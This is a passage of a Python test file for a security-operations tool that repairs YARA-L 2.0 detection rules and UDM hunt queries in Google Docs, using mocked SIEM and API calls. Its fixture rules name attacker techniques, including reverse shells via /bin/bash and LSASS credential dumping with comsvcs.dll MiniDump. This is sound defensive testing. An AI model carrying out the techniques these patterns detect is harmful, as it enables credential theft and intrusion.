        run_live_siem_check=True,
        diagnose_zero_hit_retrohunt=True,
        siem_validate_fn=fake_validate,
        siem_search_fn=fake_search,
        token_source=StaticTokenSource("adc-token"),
        transport=httpx.MockTransport(
            lambda req: httpx.Response(200, json=mock_doc_pending)
        ),
    )
    assert res2["status"] == "success"
    assert res2["yaral2_findings_count"] == 0
    assert res2["zero_hit_yaral2_findings_count"] == 0
    assert res2["skipped_existing_suggestion_count"] == 5
    assert res2["comments"]["inserted_count"] == 0
    assert res2["edits"]["applied_count"] == 0
    assert len(batch_calls) == 0


def test_find_italic_corrupted_regex_spans_recovers_udm_and_yaral2_wildcards():
    """Verifies that find_italic_corrupted_regex_spans detects paired '*' regex wildcards
    silently converted into textStyle.italic=True by Google Drive's Markdown importer
    in both standalone UDM queries and YARA-L 2.0 rules, while ignoring normal italic
    prose and intact regex literals."""
    from manager.tools.docs_review_tools import (
        extract_doc_projections,
        find_italic_corrupted_regex_spans,
    )

    # Build a Google Docs AST with:
    # 1. Normal italic prose ("Note: *verify* host telemetry.\n") -> must NOT trigger
    # 2. Standalone UDM query where /.*powershell.*/ was imported as '/.' + italic('powershell.') + '/'
    # 3. Intact UDM query where /.*whoami.*/ has italic=False -> must NOT trigger
    # 4. YARA-L 2.0 rule where /.*cmd.*/ was imported as '/.' + italic('cmd.') + '/'
    runs = [
        ("Note: ", False),
        ("verify", True),
        (" host telemetry.\n", False),
        ('UDM Hunt: `principal.hostname = "wins-d19" AND target.process.command_line = /.', False),
        ("powershell.", True),
        ('/ nocase`\n', False),
        ('Control Hunt: `principal.hostname = "wins-d19" AND target.process.command_line = /.*whoami.*/ nocase`\n', False),
        (
            "rule wins_d19_lolbin_execution_case_33280 {\n"
            "  meta:\n"
            '    author = "SOC Detection Engineering"\n'
            "  events:\n"
            '    $proc.principal.hostname = "wins-d19"\n'
            "    re.regex($proc.target.process.command_line, /.",
            False,
        ),
        ("cmd.", True),
        (
            "/) nocase\n"
            "  condition:\n"
            "    $proc\n"
            "}\n",
            False,
        ),
    ]

    elements: list[dict[str, Any]] = []
    cursor = 1
    for text, is_italic in runs:
        end_cursor = cursor + len(text)
        elements.append(
            {
                "startIndex": cursor,
                "endIndex": end_cursor,
                "textRun": {
                    "content": text,
                    "textStyle": {"italic": is_italic},
                },
            }
        )
        cursor = end_cursor

    doc = {
        "documentId": "doc-italic-regex-unit",
        "title": "Italic Corrupted Regex Test",
        "body": {"content": [{"paragraph": {"elements": elements}}]},
    }

    projections = extract_doc_projections(doc)
    plain_text = projections["baseline_text"]
    index_map = projections["baseline_index_map"]

    comments, edits, findings = find_italic_corrupted_regex_spans(
        doc, plain_text=plain_text, index_map=index_map
    )
    assert len(findings) == 2
    assert len(comments) == 2
    assert len(edits) == 2

    udm_f = findings[0]
    assert udm_f["defect_type"] == "italic_corrupted_regex_wildcard"
    assert udm_f["context_kind"] == "udm"
    assert udm_f["quote"] == "/.powershell./"
    assert udm_f["replacement"] == "/.*powershell.*/"
    assert udm_f["italic_subspans"] == ["powershell."]
    assert (
        plain_text[int(udm_f["start_index"]) - 1 : int(udm_f["end_index"]) - 1]
        == "/.powershell./"
    )
    assert (
        udm_f["query_line"]
        == 'principal.hostname = "wins-d19" AND target.process.command_line = /.*powershell.*/ nocase'
    )

    yl2_f = findings[1]
    assert yl2_f["defect_type"] == "italic_corrupted_regex_wildcard"
    assert yl2_f["context_kind"] == "yaral2"
    assert yl2_f["rule_name"] == "wins_d19_lolbin_execution_case_33280"
    assert yl2_f["quote"] == "/.cmd./"
    assert yl2_f["replacement"] == "/.*cmd.*/"
    assert yl2_f["yaral2_backtick_regex"] == "`.*cmd.*`"
    assert yl2_f["italic_subspans"] == ["cmd."]
    assert (
        plain_text[int(yl2_f["start_index"]) - 1 : int(yl2_f["end_index"]) - 1]
        == "/.cmd./"
    )


def test_verify_and_redline_yaral2_rules_in_doc_stages_italic_corrupted_regex_wildcard():
    """Replicates the Cycle 3 Google Doc 1m91VxaVhE-28i3Ccfsxmb8-M2IZn29SNOZWMjPdUSYc
    scenario where strings:, $proc.process.command_line, and $event already have
    pending suggestions while /.cmd./ has textStyle.italic=True on 'cmd.'. Verifies
    that verify_and_redline_yaral2_rules_in_doc skips the 3 existing suggestions,
    stages the /.cmd./ -> /.*cmd.*/ wildcard recovery under writeMode='SUGGEST',
    compiles the rule, and restores retrohunt hits from 6 to 12."""
    from manager.tools.docs_review_tools import verify_and_redline_yaral2_rules_in_doc

    # Build AST matching Rule 2 of 1m91VxaVhE-28i3Ccfsxmb8-M2IZn29SNOZWMjPdUSYc
    raw_segments: list[tuple[str, bool, list[str], list[str]]] = [
        (
            "rule wins_d19_lolbin_execution_case_33280 {\n  meta:\n    author = \"SOC Detection Engineering\"\n  ",
            False,
            [],
            [],
        ),
        ("strings:", False, ["suggest.c3.strings"], []),
        ("events:", False, [], ["suggest.c3.strings"]),
        (
            '\n    $proc.principal.hostname = "wins-d19"\n    re.regex(',
            False,
            [],
            [],
        ),
        ("$proc.process.command_line", False, ["suggest.c3.field"], []),
        ("$proc.target.process.command_line", False, [], ["suggest.c3.field"]),
        (", /.", False, [], []),
        ("cmd.", True, [], []),
        ("/) nocase\n  condition:\n    ", False, [], []),
        ("$event", False, ["suggest.c3.cond"], []),
        ("$proc", False, [], ["suggest.c3.cond"]),
        ("\n}\n", False, [], []),
    ]

    elements: list[dict[str, Any]] = []
    cursor = 1
    for text, is_italic, del_ids, ins_ids in raw_segments:
        end_cursor = cursor + len(text)
        tr: dict[str, Any] = {
            "content": text,
            "textStyle": {"italic": is_italic},
        }
        if del_ids:
            tr["suggestedDeletionIds"] = del_ids
        if ins_ids:
            tr["suggestedInsertionIds"] = ins_ids
        elements.append(
            {
                "startIndex": cursor,
                "endIndex": end_cursor,
                "textRun": tr,
            }
        )
        cursor = end_cursor

    mock_doc = {
        "documentId": "doc-c3-italic-wildcard",
        "title": "Cycle 3 Italic Regex Recovery Test",
        "body": {"content": [{"paragraph": {"elements": elements}}]},
    }

    def fake_validate(rule_str: str) -> dict[str, Any]:
        assert "events:" in rule_str
        assert "re.regex($proc.target.process.command_line, `.*cmd.*`) nocase" in rule_str
        return {"success": True, "message": "Rule validation passed."}

    def fake_search(query: str, **kwargs: Any) -> dict[str, Any]:
        if "/.*cmd.*/" in query:
            return {"events": [{"id": i} for i in range(12)], "total_events": 12}
        if "/.cmd./" in query:
            return {"events": [{"id": i} for i in range(6)], "total_events": 6}
        return {"events": [], "total_events": 0}

    batch_calls: list[dict[str, Any]] = []

    def handler(request: httpx.Request) -> httpx.Response:
        if request.method == "GET":
            return httpx.Response(200, json=mock_doc)
        if request.method == "POST" and request.url.path.endswith(":batchUpdate"):
            body = json.loads(request.content.decode("utf-8"))
            batch_calls.append(body)
            if "writeControl" not in body:
                return httpx.Response(
                    200,
                    json={"replies": [{"insertComment": {"commentId": "c-italic-1"}}]},
                )
            return httpx.Response(200, json={"replies": []})
        return httpx.Response(404)

    res = verify_and_redline_yaral2_rules_in_doc(
        "doc-c3-italic-wildcard",
        run_live_siem_check=True,
        diagnose_zero_hit_retrohunt=False,
        siem_validate_fn=fake_validate,
        siem_search_fn=fake_search,
        token_source=StaticTokenSource("adc-token"),
        transport=httpx.MockTransport(handler),
    )
    assert res["status"] == "success"
    assert res["skipped_existing_suggestion_count"] == 3
    assert res["yaral2_findings_count"] == 1
    finding = res["findings"][0]
    assert finding["defect_type"] == "italic_corrupted_regex_wildcard"
    assert finding["quote"] == "/.cmd./"
    assert finding["replacement"] == "/.*cmd.*/"
    assert (
        finding["retrohunt_udm_query"]
        == 'principal.hostname = "wins-d19" AND target.process.command_line = /.*cmd.*/ nocase'
    )
    assert res["siem_rule_checks"][0]["compiler_verified"] is True
    assert res["siem_rule_checks"][0]["retrohunt_event_count"] == 12
    assert (
        "events_matched=12"
        in batch_calls[0]["requests"][0]["insertComment"]["content"]
    )
    assert batch_calls[1]["writeControl"] == {"writeMode": "SUGGEST"}


def test_reconstruct_markdown_from_doc_ast_headings_lists_tables_and_italic_regex():
    """Verifies that reconstruct_markdown_from_doc_ast reconstructs #, ##, ### headings,
    nested bullet and numbered lists, pipe-delimited Markdown tables, accepted Suggested
    Edits, and italic-corrupted regex wildcards from a Google Docs AST."""
    from manager.tools.docs_review_tools import reconstruct_markdown_from_doc_ast

    doc = {
        "documentId": "doc-ast-markdown",
        "title": "AST Markdown Reconstructor Test",
        "lists": {
            "kix.ordered1": {
                "listProperties": {
                    "nestingLevels": [
                        {"glyphType": "DECIMAL", "glyphFormat": "%0."},
                        {"glyphType": "ALPHA", "glyphFormat": "%1."},
                    ]
                }
            },
            "kix.bullet1": {
                "listProperties": {
                    "nestingLevels": [
                        {"glyphSymbol": "-"},
                        {"glyphSymbol": "-"},
                    ]
                }
            },
        },
        "body": {
            "content": [
                {
                    "paragraph": {
                        "paragraphStyle": {"namedStyleType": "HEADING_1"},
                        "elements": [
                            {"textRun": {"content": "Compromised User Account Runbook\n"}}
                        ],
                    }
                },
                {
                    "paragraph": {
                        "paragraphStyle": {"namedStyleType": "HEADING_2"},
                        "elements": [{"textRun": {"content": "Triage Steps\n"}}],
                    }
                },
                {
                    "paragraph": {
                        "bullet": {"listId": "kix.ordered1", "nestingLevel": 0},
                        "elements": [
                            {"textRun": {"content": "Verify SIEM alert for "}},
                            {
                                "textRun": {
                                    "content": "user.email",
                                    "suggestedDeletionIds": ["suggest.1"],
                                }
                            },
                            {
                                "textRun": {
                                    "content": "principal.user.email_addresses",
                                    "suggestedInsertionIds": ["suggest.1"],
                                }
                            },
                            {"textRun": {"content": "\n"}},
                        ],
                    }
                },
                {
                    "paragraph": {
                        "bullet": {"listId": "kix.ordered1", "nestingLevel": 0},
                        "elements": [
                            {"textRun": {"content": "Run endpoint regex hunt `target.process.command_line = /."}},
                            {
                                "textRun": {
                                    "content": "cmd.",
                                    "textStyle": {"italic": True},
                                }
                            },
                            {"textRun": {"content": "/ nocase`\n"}},
                        ],
                    }
                },
                {
                    "paragraph": {
                        "paragraphStyle": {"namedStyleType": "HEADING_3"},
                        "elements": [{"textRun": {"content": "Containment Checklist\n"}}],
                    }
                },
                {
                    "paragraph": {
                        "bullet": {"listId": "kix.bullet1", "nestingLevel": 0},
                        "elements": [{"textRun": {"content": "Revoke active OAuth tokens\n"}}],
                    }
                },
                {
                    "paragraph": {
                        "bullet": {"listId": "kix.bullet1", "nestingLevel": 1},
                        "elements": [{"textRun": {"content": "Confirm IdP session termination\n"}}],
                    }
                },
                {
                    "table": {
                        "tableRows": [
                            {
                                "tableCells": [
                                    {
                                        "content": [
                                            {
                                                "paragraph": {
                                                    "elements": [{"textRun": {"content": "Phase\n"}}]
                                                }
                                            }
                                        ]
                                    },
                                    {
                                        "content": [
                                            {
                                                "paragraph": {
                                                    "elements": [{"textRun": {"content": "SLA\n"}}]
                                                }
                                            }
                                        ]
                                    },
                                ]
                            },
                            {
                                "tableCells": [
                                    {
                                        "content": [
                                            {
                                                "paragraph": {
                                                    "elements": [{"textRun": {"content": "Containment\n"}}]
                                                }
                                            }
                                        ]
                                    },
                                    {
                                        "content": [
                                            {
                                                "paragraph": {
                                                    "elements": [{"textRun": {"content": "15m\n"}}]
                                                }
                                            }
                                        ]
                                    },
                                ]
                            },
                        ]
                    }
                },
            ]
        },
    }

    recon = reconstruct_markdown_from_doc_ast(doc, view_mode="accepted")
    md = recon["markdown"]
    assert recon["headings_reconstructed_count"] == 3
    assert recon["list_items_reconstructed_count"] == 4
    assert recon["tables_reconstructed_count"] == 1
    assert recon["italic_regex_wildcards_recovered_count"] == 1
    assert "# Compromised User Account Runbook" in md
    assert "## Triage Steps" in md
    assert "1. Verify SIEM alert for principal.user.email_addresses" in md
    assert "2. Run endpoint regex hunt `target.process.command_line = /.*cmd.*/ nocase`" in md
    assert "### Containment Checklist" in md
    assert "- Revoke active OAuth tokens" in md
    assert "  - Confirm IdP session termination" in md
    assert "| Phase | SLA |\n| --- | --- |\n| Containment | 15m |" in md


def test_list_doc_comments_and_export_governance_gate_blocks_unresolved(tmp_path: Path):
    """Verifies list_doc_comments against Google Drive API v3 files.comments and
    confirms that export_accepted_doc_to_markdown(..., require_resolved_comments=True)
    returns status='blocked_unresolved_comments' without writing output_path when open
    comments remain, and succeeds once all comments are resolved."""
    from google.adk.tools.function_tool import FunctionTool
    from manager.tools import tools as tools_module
    from manager.tools.docs_review_tools import (
        export_accepted_doc_to_markdown,
        list_doc_comments,
    )

    mock_doc = _make_single_paragraph_doc(
        "doc-gov-gate",
        "Runbook Governance Gate Test",
        "# Compromised User Account Runbook\n1. Check principal.user.email_addresses\n",
    )
    comments_state = [
        {
            "id": "c-resolved-1",
            "content": "Verified UDM field path.",
            "resolved": True,
            "deleted": False,
            "author": {"displayName": "Analyst One"},
            "quotedFileContent": {"value": "principal.user.email_addresses"},
            "createdTime": "2026-10-11T08:00:00Z",
        },
        {
            "id": "c-open-2",
            "content": "Confirm SLA before promoting to production runbooks.",
            "resolved": False,
            "deleted": False,
            "author": {"displayName": "Detection Lead"},
            "quotedFileContent": {"value": "Compromised User Account Runbook"},
            "createdTime": "2026-10-11T08:05:00Z",
        },
    ]

    def handler(request: httpx.Request) -> httpx.Response:
        if request.method == "GET" and "/comments" in request.url.path:
            return httpx.Response(200, json={"comments": comments_state})
        if request.method == "GET":
            return httpx.Response(200, json=mock_doc)
        return httpx.Response(404)

    transport = httpx.MockTransport(handler)
    listed = list_doc_comments(
        "doc-gov-gate",
        token_source=StaticTokenSource("adc-token"),
        transport=transport,
    )
    assert listed["status"] == "success"
    assert listed["total_comment_count"] == 2
    assert listed["unresolved_comment_count"] == 1
    assert listed["resolved_comment_count"] == 1
    assert listed["unresolved_comments"][0]["id"] == "c-open-2"

    out_file = tmp_path / "blocked_export.md"
    blocked = export_accepted_doc_to_markdown(
        "doc-gov-gate",
        skill_name="compromised-user-account-response",
        require_resolved_comments=True,
        output_path=str(out_file),
        skill_content_override=(
            "---\n"
            "name: compromised-user-account-response\n"
            "description: Compromised account IRP\n"
            "---\n\n"
            "# Compromised User Account Runbook\n"
        ),
        token_source=StaticTokenSource("adc-token"),
        transport=transport,
    )
    assert blocked["status"] == "blocked_unresolved_comments"
    assert blocked["unresolved_comment_count"] == 1
    assert blocked["output_path"] is None
    assert not out_file.exists()

    # Resolve the open comment and verify export succeeds
    comments_state[1]["resolved"] = True
    allowed = export_accepted_doc_to_markdown(
        "doc-gov-gate",
        skill_name="compromised-user-account-response",
        require_resolved_comments=True,
        output_path=str(out_file),
        skill_content_override=(
            "---\n"
            "name: compromised-user-account-response\n"
            "description: Compromised account IRP\n"
            "---\n\n"
            "# Compromised User Account Runbook\n"
        ),
        token_source=StaticTokenSource("adc-token"),
        transport=transport,
    )
    assert allowed["status"] == "success"
    assert allowed["unresolved_comment_count"] == 0
    assert allowed["resolved_comment_count"] == 2
    assert out_file.exists()

    wrapped = tools_module.instrument_tool(tools_module.list_doc_comments)
    ft = FunctionTool(wrapped)
    decl = ft._get_declaration()
    assert decl is not None
    assert decl.name == "list_doc_comments"


def test_export_accepted_doc_to_markdown_reconstructs_structure_and_frontmatter(tmp_path: Path):
    """Verifies that export_accepted_doc_to_markdown strips Google Drive's collapsed
    single-line YAML frontmatter artifact, restores canonical YAML frontmatter, and
    reconstructs headings, lists, and tables from the Google Docs AST."""
    from manager.tools.docs_review_tools import export_accepted_doc_to_markdown
    from skills.drive_registry import parse_frontmatter

    doc = {
        "documentId": "doc-export-struct",
        "title": "Runbook_Redline_compromised-user-account-response_Case_33278",
        "lists": {
            "kix.list1": {
                "listProperties": {
                    "nestingLevels": [{"glyphType": "DECIMAL", "glyphFormat": "%0."}]
                }
            }
        },
        "body": {
            "content": [
                {
                    "paragraph": {
                        "paragraphStyle": {"namedStyleType": "NORMAL_TEXT"},
                        "elements": [
                            {
                                "textRun": {
                                    "content": (
                                        "name: compromised-user-account-response "
                                        "description: Steps for compromised user account\n"
                                    )
                                }
                            }
                        ],
                    }
                },
                {
                    "paragraph": {
                        "paragraphStyle": {"namedStyleType": "HEADING_1"},
                        "elements": [
                            {
                                "textRun": {
                                    "content": "IRP: Compromised User Account Response\n"
                                }
                            }
                        ],
                    }
                },
                {
                    "paragraph": {
                        "bullet": {"listId": "kix.list1", "nestingLevel": 0},
                        "elements": [
                            {
                                "textRun": {
                                    "content": "Query `principal.user.email_addresses` in Chronicle SIEM\n"
                                }
                            }
                        ],
                    }
                },
            ]
        },
    }

    out_file = tmp_path / "exported_runbook.md"
    res = export_accepted_doc_to_markdown(
        "doc-export-struct",
        skill_name="compromised-user-account-response",
        reconstruct_markdown_structure=True,
        output_path=str(out_file),
        skill_content_override=(
            "---\n"
            "name: compromised-user-account-response\n"
            "description: Steps for compromised user account\n"
            "category: irps\n"
            "version: 1.0.0\n"
            "---\n\n"
            "# IRP: Compromised User Account Response\n"
        ),
        token_source=StaticTokenSource("adc-token"),
        transport=httpx.MockTransport(lambda req: httpx.Response(200, json=doc)),
    )
    assert res["status"] == "success"
    assert res["frontmatter_restored"] is True
    assert res["frontmatter_valid"] is True
    assert res["headings_reconstructed_count"] == 1
    assert res["list_items_reconstructed_count"] == 1
    md = res["accepted_markdown"]
    assert md.startswith("---\nname: compromised-user-account-response\n")
    assert "# IRP: Compromised User Account Response" in md
    assert "1. Query `principal.user.email_addresses` in Chronicle SIEM" in md
    assert "name: compromised-user-account-response description:" not in md
    fm = parse_frontmatter(md)
    assert fm["name"] == "compromised-user-account-response"


# ---------------------------------------------------------------------------
# Cycle 12 (H12): Automated YARA-L 2.0 meta: Block MITRE ATT&CK
# Tactic/Technique Synthesis & Consistency Red-Liner in Google Docs
# ---------------------------------------------------------------------------


def test_infer_yaral2_mitre_from_events_and_extract_yaral2_meta_spec_multiline_and_collapsed():
    """Verifies ``infer_yaral2_mitre_from_events`` across ``T1098.003``, ``T1059.001``,
    ``T1059.003``, ``T1059.004``, ``T1003.001``, ``T1218.011``, and ``T1543.003``,
    and verifies ``extract_yaral2_meta_spec`` 1-based UTF-16 spans on both multi-line
    and Drive-collapsed single-line YARA-L 2.0 rules."""
    from manager.tools.docs_review_tools import (
        extract_yaral2_meta_spec,
        infer_yaral2_mitre_from_events,
    )

    rules_and_expected = [
        (
            'rule gcp_sa_privilege_escalation_case_33278 {\n'
            '  meta:\n'
            '    author = "Chronicle SOC"\n'
            '  events:\n'
            '    $e.metadata.log_type = "GCP_CLOUDAUDIT"\n'
            '    $e.principal.ip = "104.198.226.161"\n'
            '    $e.target.resource.name = "projects/base-production"\n'
            '  condition:\n'
            '    $e\n'
            '}',
            "T1098.003",
            "Persistence / Privilege Escalation",
            "https://attack.mitre.org/techniques/T1098/003/",
        ),
        (
            'rule wins_d19_ps_stager {\n'
            '  meta:\n'
            '    mitre_attack_technique = "T1059.003"\n'
            '  events:\n'
            '    re.regex($e.target.process.command_line, `.*powershell.*`) nocase\n'
            '  condition:\n'
            '    $e\n'
            '}',
            "T1059.001",
            "Execution",
            "https://attack.mitre.org/techniques/T1059/001/",
        ),
        (
            'rule wins_d19_cmd_exec {\n'
            '  meta:\n'
            '    author = "SOC"\n'
            '  events:\n'
            '    re.regex($e.target.process.command_line, `.*cmd\\.exe.*`) nocase\n'
            '  condition:\n'
            '    $e\n'
            '}',
            "T1059.003",
            "Execution",
            "https://attack.mitre.org/techniques/T1059/003/",
        ),
        (
            'rule linux_reverse_shell {\n'
            '  meta:\n'
            '    author = "SOC"\n'
            '  events:\n'
            '    re.regex($e.target.process.command_line, `.*/bin/bash.*`) nocase\n'
            '  condition:\n'
            '    $e\n'
            '}',
            "T1059.004",
            "Execution",
            "https://attack.mitre.org/techniques/T1059/004/",
        ),
        (
            'rule lsass_comsvcs_dump {\n'
            '  meta:\n'
            '    author = "SOC"\n'
            '  events:\n'
            '    re.regex($e.target.process.command_line, `.*comsvcs\\.dll.*MiniDump.*`) nocase\n'
            '  condition:\n'
            '    $e\n'
            '}',
            "T1003.001",
            "Credential Access",
            "https://attack.mitre.org/techniques/T1003/001/",
        ),
        (
            'rule rundll32_proxy_exec {\n'
            '  meta:\n'
            '    author = "SOC"\n'
            '  events:\n'
            '    re.regex($e.target.process.command_line, `.*rundll32\\.exe.*`) nocase\n'
            '  condition:\n'
            '    $e\n'
            '}',
            "T1218.011",
            "Defense Evasion",
            "https://attack.mitre.org/techniques/T1218/011/",
        ),
        (
            'rule wins_d19_derpservice_case_33280 {\n'
            '  meta:\n'
            '    author = "SOC"\n'
            '  events:\n'
            '    $e.principal.hostname = "wins-d19"\n'
            '    re.regex($e.target.process.command_line, `.*DERPService.*`) nocase\n'
            '  condition:\n'
            '    $e\n'
            '}',
            "T1543.003",
            "Persistence / Privilege Escalation",
            "https://attack.mitre.org/techniques/T1543/003/",
        ),
    ]

    for r_text, exp_id, exp_tactic, exp_url in rules_and_expected:
        inf = infer_yaral2_mitre_from_events(r_text)
        assert inf is not None
        assert inf["canonical_id"] == exp_id
        assert inf["tactic"] == exp_tactic
        assert inf["reference_url"] == exp_url

    multiline_rule = (
        'rule sample_meta_rule {\n'
        '  meta:\n'
        '    author = "Chronicle SOC"\n'
        '    severity = "HIGH"\n'
        '  events:\n'
        '    $e.principal.hostname = "wins-d19"\n'
        '  condition:\n'
        '    $e\n'
        '}'
    )
    m_spec = extract_yaral2_meta_spec(multiline_rule)
    assert m_spec["has_meta"] is True
    assert m_spec["is_collapsed"] is False
    assert m_spec["indent"] == "    "
    assert len(m_spec["entries"]) == 2
    sev_entry = m_spec["entries_by_key"]["severity"]
    assert sev_entry["value"] == "HIGH"
    assert (
        multiline_rule[
            sev_entry["value_inner_start_index"]
            - 1 : sev_entry["value_inner_end_index"]
            - 1
        ]
        == "HIGH"
    )
    assert m_spec["insertion_anchor"]["quote"] == 'severity = "HIGH"'

    collapsed_rule = (
        'rule collapsed_meta_rule { meta: author = "Chronicle SOC" '
        'severity = "HIGH" events: $e.principal.hostname = "wins-d19" condition: $e }'
    )
    c_spec = extract_yaral2_meta_spec(collapsed_rule)
    assert c_spec["has_meta"] is True
    assert c_spec["is_collapsed"] is True
    assert c_spec["indent"] == " "
    assert len(c_spec["entries"]) == 2
    assert c_spec["insertion_anchor"]["quote"] == 'severity = "HIGH"'


def test_find_yaral2_meta_mitre_spans_missing_synthesis_and_consistency_repairs():
    """Verifies ``find_yaral2_meta_mitre_spans`` across ``missing_meta_mitre_attribution``,
    ``meta_mitre_technique_mismatch`` (including cross-family ``T1059.003`` -> ``T1098.003``
    and ``T1543.003``), ``meta_mitre_tactic_mismatch``, and ``meta_mitre_url_mismatch``
    (including dot-to-slash URL normalization) with ``0`` false positives on valid
    ``meta:`` blocks."""
    from manager.tools.docs_review_tools import find_yaral2_meta_mitre_spans

    doc_text = (
        'rule gcp_sa_privilege_escalation_missing_meta_case_33278 {\n'
        '  meta:\n'
        '    author = "Chronicle SOC"\n'
        '    severity = "HIGH"\n'
        '  events:\n'
        '    $e.metadata.log_type = "GCP_CLOUDAUDIT"\n'
        '    $e.principal.ip = "104.198.226.161"\n'
        '    $e.target.resource.name = "projects/base-production"\n'
        '  condition:\n'
        '    $e\n'
        '}\n\n'
        'rule wins_d19_powershell_inconsistent_meta_case_33269 {\n'
        '  meta:\n'
        '    author = "Chronicle SOC"\n'
        '    mitre_attack_technique = "T1059.003"\n'
        '    mitre_attack_tactic = "Initial Access"\n'
        '    mitre_attack_url = "https://attack.mitre.org/techniques/T1059.003/"\n'
        '  events:\n'
        '    $e.principal.hostname = "wins-d19"\n'
        '    re.regex($e.target.process.command_line, `.*powershell.*`) nocase\n'
        '  condition:\n'
        '    $e\n'
        '}\n\n'
        'rule wins_d19_derpservice_cross_family_meta_case_33280 {\n'
        '  meta:\n'
        '    author = "Chronicle SOC"\n'
        '    mitre_attack_technique = "T1059.003"\n'
        '    mitre_attack_tactic = "Defense Evasion"\n'
        '    mitre_attack_url = "https://attack.mitre.org/techniques/T1059.001/"\n'
        '  events:\n'
        '    $e.principal.hostname = "wins-d19"\n'
        '    re.regex($e.target.process.command_line, `.*DERPService.*`) nocase\n'
        '  condition:\n'
        '    $e\n'
        '}\n\n'
        'rule wins_d19_cmd_valid_meta_control {\n'
        '  meta:\n'
        '    author = "Chronicle SOC"\n'
        '    mitre_attack_technique = "T1059.003"\n'
        '    mitre_attack_tactic = "Execution"\n'
        '    mitre_attack_url = "https://attack.mitre.org/techniques/T1059/003/"\n'
        '  events:\n'
        '    $e.principal.hostname = "wins-d19"\n'
        '    re.regex($e.target.process.command_line, `.*cmd\\.exe.*`) nocase\n'
        '  condition:\n'
        '    $e\n'
        '}\n'
    )
    mock_doc = _make_single_paragraph_doc(
        "doc-meta-mitre", "Meta MITRE Test", doc_text
    )
    plain, idx_map = _extract_text_and_index_map(mock_doc)
    comments, edits, findings = find_yaral2_meta_mitre_spans(
        plain, idx_map, synthesize_missing_meta=True
    )
    # 1 synthesis in rule 1 + 3 mismatches in rule 2 + 3 mismatches in rule 3 + 0 in rule 4 = 7
    assert len(findings) == 7
    assert len(comments) == 7
    assert len(edits) == 7

    by_rule: dict[str, list[dict[str, Any]]] = {}
    for f in findings:
        by_rule.setdefault(f["rule_name"], []).append(f)

    assert "wins_d19_cmd_valid_meta_control" not in by_rule
    r1_f = by_rule["gcp_sa_privilege_escalation_missing_meta_case_33278"]
    assert len(r1_f) == 1
    assert r1_f[0]["defect_type"] == "missing_meta_mitre_attribution"
    assert r1_f[0]["canonical_id"] == "T1098.003"
    assert 'mitre_attack_technique = "T1098.003"' in r1_f[0]["replacement"]
    assert (
        'mitre_attack_tactic = "Persistence / Privilege Escalation"'
        in r1_f[0]["replacement"]
    )
    assert (
        'mitre_attack_url = "https://attack.mitre.org/techniques/T1098/003/"'
        in r1_f[0]["replacement"]
    )

    r2_f = by_rule["wins_d19_powershell_inconsistent_meta_case_33269"]
    assert [f["defect_type"] for f in r2_f] == [
        "meta_mitre_technique_mismatch",
        "meta_mitre_tactic_mismatch",
        "meta_mitre_url_mismatch",
    ]
    assert [f["replacement"] for f in r2_f] == [
        "T1059.001",
        "Execution",
        "https://attack.mitre.org/techniques/T1059/001/",
    ]

    r3_f = by_rule["wins_d19_derpservice_cross_family_meta_case_33280"]
    assert [f["defect_type"] for f in r3_f] == [
        "meta_mitre_technique_mismatch",
        "meta_mitre_tactic_mismatch",
        "meta_mitre_url_mismatch",
    ]
    assert [f["replacement"] for f in r3_f] == [
        "T1543.003",
        "Persistence / Privilege Escalation",
        "https://attack.mitre.org/techniques/T1543/003/",
    ]


def test_find_yaral2_rule_spans_with_verify_meta_mitre_combines_meta_and_events_repairs():
    """Verifies that ``find_yaral2_rule_spans(..., verify_meta_mitre=True, synthesize_missing_meta=True)``
    produces non-overlapping UTF-16 spans across ``meta:``, ``events:``, ``outcome:``,
    and ``condition:`` and synthesizes a unified ``repaired_rule_text``."""
    from manager.tools.docs_review_tools import find_yaral2_rule_spans

    rule_text = (
        'rule gcp_combined_meta_and_schema_defects {\n'
        '  meta:\n'
        '    author = "Chronicle SOC"\n'
        '    severity = "HIGH"\n'
        '  strings:\n'
        '    $e.metadata.log_type = "GCP_CLOUDAUDIT"\n'
        '    $e.ip = "104.198.226.161"\n'
        '    $e.resource.name = "projects/base-production"\n'
        '  condition:\n'
        '    $event\n'
        '}'
    )
    mock_doc = _make_single_paragraph_doc(
        "doc-combined-meta", "Combined Meta + Schema", rule_text
    )
    plain, idx_map = _extract_text_and_index_map(mock_doc)
    comments, edits, findings = find_yaral2_rule_spans(
        plain,
        idx_map,
        verify_meta_mitre=True,
        synthesize_missing_meta=True,
    )
    defect_types = [f["defect_type"] for f in findings]
    assert defect_types == [
        "missing_meta_mitre_attribution",
        "yara_strings_section",
        "invalid_udm_field",
        "invalid_udm_field",
        "condition_variable_mismatch",
    ]
    # Verify non-overlapping ascending spans
    for i in range(len(edits) - 1):
        assert edits[i]["end_index"] <= edits[i + 1]["start_index"]

    repaired = findings[0]["repaired_rule_text"]
    assert 'mitre_attack_technique = "T1098.003"' in repaired
    assert 'mitre_attack_tactic = "Persistence / Privilege Escalation"' in repaired
    assert (
        'mitre_attack_url = "https://attack.mitre.org/techniques/T1098/003/"'
        in repaired
    )
    assert "events:" in repaired
    assert "$e.principal.ip" in repaired
    assert "$e.target.resource.name" in repaired


def test_verify_yaral2_rule_with_siem_compiles_synthesized_meta_mitre_block():
    """Verifies that ``verify_yaral2_rule_with_siem(..., verify_meta_mitre=True, synthesize_missing_meta=True)``
    passes the synthesized/repaired ``meta:`` MITRE rule to ``validate_rule`` and ``search_udm``."""
    from manager.tools.docs_review_tools import verify_yaral2_rule_with_siem

    rule_text = (
        'rule wins_d19_derpservice_meta_siem_check {\n'
        '  meta:\n'
        '    author = "Chronicle SOC"\n'
        '    severity = "HIGH"\n'
        '  events:\n'
        '    $e.principal.hostname = "wins-d19"\n'
        '    re.regex($e.target.process.command_line, `.*DERPService.*`) nocase\n'
        '  condition:\n'
        '    $e\n'
        '}'
    )
    compiled_rules: list[str] = []

    def fake_validate(candidate_rule: str) -> dict[str, Any]:
        compiled_rules.append(candidate_rule)
        return {"success": True, "message": "Rule verified"}

    def fake_search(query: str, start_time: str, end_time: str, max_events: int) -> dict[str, Any]:
        return {"events": [{"udm": {"principal": {"hostname": "wins-d19"}}}], "total_events": 1}

    res = verify_yaral2_rule_with_siem(
        rule_text,
        verify_meta_mitre=True,
        synthesize_missing_meta=True,
        siem_validate_fn=fake_validate,
        siem_search_fn=fake_search,
    )
    assert res["status"] == "success"
    assert res["compiler_verified"] is True
    assert res["retrohunt_verified"] is True
    assert res["retrohunt_event_count"] == 1
    assert len(compiled_rules) == 1
    assert 'mitre_attack_technique = "T1543.003"' in compiled_rules[0]
    assert (
